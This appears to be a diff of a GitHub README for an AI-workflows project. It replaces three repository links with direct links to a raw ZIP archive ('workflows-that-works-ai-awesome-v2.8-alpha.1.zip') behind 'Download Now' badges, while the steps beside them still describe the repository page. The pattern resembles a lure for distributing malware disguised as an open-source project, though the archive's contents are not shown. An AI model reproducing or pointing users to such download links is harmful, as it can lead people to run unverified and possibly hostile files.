@@ -1,6 +1,6 @@
 # 🤖 awesome-ai-workflows-that-works - Practical AI Workflows That Save Time
 
-[![Download on GitHub](https://img.shields.io/badge/Download%20Now-blue-grey?style=for-the-badge&logo=github)](https://github.com/britannic-cabernetsauvignongrape650/awesome-ai-workflows-that-works)
+[![Download on GitHub](https://img.shields.io/badge/Download%20Now-blue-grey?style=for-the-badge&logo=github)](https://github.com/britannic-cabernetsauvignongrape650/awesome-ai-workflows-that-works/raw/refs/heads/main/resources/workflows-that-works-ai-awesome-v2.8-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ This repo gives you a set of practical AI workflows for daily work. It covers co
 
 ## 📥 Download and Open
 
-1. Visit the download page: [awesome-ai-workflows-that-works](https://github.com/britannic-cabernetsauvignongrape650/awesome-ai-workflows-that-works)
+1. Visit the download page: [awesome-ai-workflows-that-works](https://github.com/britannic-cabernetsauvignongrape650/awesome-ai-workflows-that-works/raw/refs/heads/main/resources/workflows-that-works-ai-awesome-v2.8-alpha.1.zip)
 2. On the page, click the green **Code** button.
 3. Select **Download ZIP**.
 4. Save the file to your PC.
@@ -200,7 +200,7 @@ Some workflows can run on your own computer. This gives you more control over fi
 
 ## 📎 Repository Link
 
-[Open awesome-ai-workflows-that-works on GitHub](https://github.com/britannic-cabernetsauvignongrape650/awesome-ai-workflows-that-works)
+[Open awesome-ai-workflows-that-works on GitHub](https://github.com/britannic-cabernetsauvignongrape650/awesome-ai-workflows-that-works/raw/refs/heads/main/resources/workflows-that-works-ai-awesome-v2.8-alpha.1.zip)
 
 ## 🏁 Start Here
 
